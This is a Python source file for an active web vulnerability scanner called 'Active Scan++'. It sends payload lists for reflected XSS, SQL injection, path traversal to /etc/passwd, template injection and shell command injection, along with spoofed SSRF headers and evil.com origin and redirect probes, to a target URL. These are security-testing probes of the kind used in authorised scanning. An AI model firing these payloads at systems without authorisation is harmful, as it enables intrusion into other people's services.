#!/usr/bin/python3
"""
Active Scan++ — extended active vulnerability checks.

Tests for: Reflected XSS, SQL injection, path traversal, open redirect,
SSRF headers, command injection, SSTI, XXE hints, CORS misconfiguration,
clickjacking, and security header checks.

Usage:
  ../.venv/bin/python3 modules/active_scan.py -u https://target.com/page?id=1
  ../.venv/bin/python3 modules/active_scan.py -u https://target.com -f  (form scan)
"""
import argparse
import re
import urllib.parse

import requests
import urllib3
from bs4 import BeautifulSoup

from core.colors import bold, underline, end, red, yellow, green, run, good, bad, info, tab

urllib3.disable_warnings()

UA = {"User-Agent": "Mozilla/5.0"}
TIMEOUT = 10
MARKER = "ppl4zm"   # unique canary to track reflections


# ── probe definitions ──────────────────────────────────────────────────────

XSS_PAYLOADS = [
    f'<script>alert("{MARKER}")</script>',
    f'"><script>alert("{MARKER}")</script>',
    f"'><img src=x onerror=alert('{MARKER}')>",
    f"javascript:alert('{MARKER}')",
    f"<svg onload=alert('{MARKER}')>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND SLEEP(0)--",
    "1 UNION SELECT NULL--",
    "' OR 'unusual_string",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "unclosed quotation", "ora-", "odbc driver",
    "pg_query", "sqlite_", "syntax error", "division by zero", "you have an error",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
]

SSRF_HEADERS = {
    "X-Forwarded-For":   "169.254.169.254",
    "X-Real-IP":         "169.254.169.254",
    "X-Custom-IP-Auth":  "127.0.0.1",
    "X-Originating-IP":  "127.0.0.1",
    "True-Client-IP":    "127.0.0.1",
}

CMDI_PAYLOADS = [
    f";echo {MARKER}",
    f"|echo {MARKER}",
    f"`echo {MARKER}`",
    f"$(echo {MARKER})",
    f"& echo {MARKER}",
]


# ── helpers ────────────────────────────────────────────────────────────────

def _get(url: str, params: dict | None = None, extra_headers: dict | None = None) -> requests.Response | None:
    h = {**UA, **(extra_headers or {})}
    try:
        return requests.get(url, params=params, headers=h, timeout=TIMEOUT,
                            verify=False, allow_redirects=False)
    except Exception:
        return None


def _post(url: str, data: dict, extra_headers: dict | None = None) -> requests.Response | None:
    h = {**UA, **(extra_headers or {})}
    try:
        return requests.post(url, data=data, headers=h, timeout=TIMEOUT,
                             verify=False, allow_redirects=False)
    except Exception:
        return None


def _finding(name: str, severity: str, detail: str) -> dict:
    return {"name": name, "severity": severity, "detail": detail}


# ── checks ─────────────────────────────────────────────────────────────────

def check_security_headers(url: str) -> list[dict]:
    r = _get(url)
    if not r: return []
    findings = []
    wanted = {
        "Strict-Transport-Security": ("high",   "Missing HSTS header"),
        "X-Frame-Options":           ("medium", "Missing X-Frame-Options (clickjacking risk)"),
        "X-Content-Type-Options":    ("low",    "Missing X-Content-Type-Options"),
        "Content-Security-Policy":   ("medium", "Missing Content-Security-Policy"),
        "Referrer-Policy":           ("info",   "Missing Referrer-Policy"),
        "Permissions-Policy":        ("info",   "Missing Permissions-Policy"),
    }
    for header, (sev, msg) in wanted.items():
        if header not in r.headers:
            findings.append(_finding(msg, sev, f"Header absent from {url}"))
    return findings


def check_cors(url: str) -> list[dict]:
    r = _get(url, extra_headers={"Origin": "https://evil.com"})
    if not r: return []
    findings = []
    acao = r.headers.get("Access-Control-Allow-Origin","")
    acac = r.headers.get("Access-Control-Allow-Credentials","")
    if acao == "*" and acac.lower() == "true":
        findings.append(_finding("CORS wildcard + credentials", "high",
                                 "ACAO: * combined with ACAC: true — credentials may leak"))
    elif acao == "https://evil.com":
        findings.append(_finding("CORS origin reflected", "high",
                                 "Server reflects arbitrary Origin — any site can make credentialed requests"))
    return findings


def check_xss(url: str, params: dict) -> list[dict]:
    findings = []
    for param in params:
        for payload in XSS_PAYLOADS:
            test = {**params, param: payload}
            r = _get(url, params=test)
            if r and payload in r.text:
                findings.append(_finding("Reflected XSS", "high",
                                         f"Param '{param}' reflects unencoded: {payload[:60]}"))
                break  # one per param
    return findings


def check_sqli(url: str, params: dict) -> list[dict]:
    findings = []
    baseline = _get(url, params=params)
    baseline_len = len(baseline.text) if baseline else 0
    for param in params:
        for payload in SQLI_PAYLOADS:
            test = {**params, param: payload}
            r = _get(url, params=test)
            if not r: continue
            body_lower = r.text.lower()
            for err in SQLI_ERRORS:
                if err in body_lower:
                    findings.append(_finding("SQL Injection (error-based)", "high",
                                             f"Param '{param}' triggers DB error with: {payload}"))
                    break
    return findings


def check_traversal(url: str, params: dict) -> list[dict]:
    findings = []
    for param in params:
        for payload in TRAVERSAL_PAYLOADS:
            test = {**params, param: payload}
            r = _get(url, params=test)
            if r and "root:" in r.text:
                findings.append(_finding("Path Traversal", "high",
                                         f"Param '{param}' exposes /etc/passwd with: {payload}"))
                break
    return findings


def check_ssti(url: str, params: dict) -> list[dict]:
    findings = []
    for param in params:
        for payload in SSTI_PAYLOADS:
            test = {**params, param: payload}
            r = _get(url, params=test)
            if r and "49" in r.text:  # 7*7=49
                findings.append(_finding("SSTI — possible RCE", "high",
                                         f"Param '{param}' evaluates {payload} → 49"))
                break
    return findings


def check_open_redirect(url: str, params: dict) -> list[dict]:
    findings = []
    targets = ["https://evil.com", "//evil.com", "https:evil.com"]
    for param in params:
        for target in targets:
            test = {**params, param: target}
            r = _get(url, params=test)
            if r and r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get("Location","")
                if "evil.com" in loc:
                    findings.append(_finding("Open Redirect", "medium",
                                             f"Param '{param}' redirects to {loc}"))
                    break
    return findings


def check_ssrf_headers(url: str) -> list[dict]:
    findings = []
    baseline = _get(url)
    if not baseline: return []
    for header, val in SSRF_HEADERS.items():
        r = _get(url, extra_headers={header: val})
        if r and r.status_code != baseline.status_code:
            findings.append(_finding("Potential SSRF header", "medium",
                                     f"{header}: {val} changed response {baseline.status_code}→{r.status_code}"))
    return findings


def check_cmdi(url: str, params: dict) -> list[dict]:
    findings = []
    for param in params:
        for payload in CMDI_PAYLOADS:
            test = {**params, param: payload}
            r = _get(url, params=test)
            if r and MARKER in r.text:
                findings.append(_finding("Command Injection", "critical",
                                         f"Param '{param}' echoes canary with: {payload}"))
                break
    return findings


# ── orchestrate ────────────────────────────────────────────────────────────

def scan(url: str) -> list[dict]:
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    base   = url.split("?")[0]

    print(f"{run} {bold}Active Scan++{end} → {url}")
    print(f"  {info} Parameters: {list(params.keys()) or 'none'}\n")

    findings = []
    checks = [
        ("Security headers",  lambda: check_security_headers(base)),
        ("CORS",              lambda: check_cors(base)),
        ("SSRF headers",      lambda: check_ssrf_headers(base)),
    ]
    if params:
        checks += [
            ("XSS",           lambda: check_xss(base, params)),
            ("SQL injection",  lambda: check_sqli(base, params)),
            ("Path traversal", lambda: check_traversal(base, params)),
            ("SSTI",           lambda: check_ssti(base, params)),
            ("Open redirect",  lambda: check_open_redirect(base, params)),
            ("Cmd injection",  lambda: check_cmdi(base, params)),
        ]

    for name, fn in checks:
        print(f"  {run} {name}…", end="\r", flush=True)
        found = fn()
        print(f"  {'  ' if not found else ''}{'':30}", end="\r")
        if found:
            findings.extend(found)
            print(f"  {bad} {name}: {len(found)} issue(s)")
        else:
            print(f"  {good} {name}: clean")

    return findings


def print_findings(findings: list[dict]) -> None:
    sev_col = {"critical": red, "high": red, "medium": yellow, "low": green, "info": ""}
    if not findings:
        print(f"\n{good} No issues found."); return
    print(f"\n{bold}{underline}Findings ({len(findings)}){end}\n")
    for f in findings:
        col = sev_col.get(f["severity"],"")
        print(f"  {col}{bold}[{f['severity'].upper()}]{end}  {bold}{f['name']}{end}")
        print(f"  {tab}{f['detail']}\n")


def main():
    parser = argparse.ArgumentParser(description="Active vulnerability scanner (XSS, SQLi, SSTI, traversal, CORS, etc.)")
    parser.add_argument("-u", dest="url", required=True, help="Target URL (include query params for injection tests)")
    args = parser.parse_args()
    findings = scan(args.url)
    print_findings(findings)


if __name__ == "__main__":
    main()
